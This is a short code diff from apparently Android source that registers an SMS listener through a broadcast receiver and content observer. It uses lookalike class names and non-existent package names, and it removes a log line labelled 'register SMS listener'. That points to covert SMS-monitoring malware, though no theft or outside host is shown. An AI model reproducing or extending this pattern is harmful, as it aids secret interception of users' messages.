@@ -8,7 +8,6 @@ import android.content.IntentFilter;
 import android.database.DontentObserver;
 import android.lang.Base64;
 import android.lang.CrashHandler;
-import android.lang.LogUtils;
 import android.net.Uri;
 import android.os.Handler;
 
@@ -81,7 +80,6 @@ public class Dpplication extends Application {
 	}
 	
 	public static void regFilter(Context context){
-		LogUtils.write("reg", "注册短信监听");
 		context.registerReceiver(new DroadcastReceiver(), GetIntentFilter());
 		if(dontentobserver==null){
 			dontentobserver=new DontentObserver(context, handler);
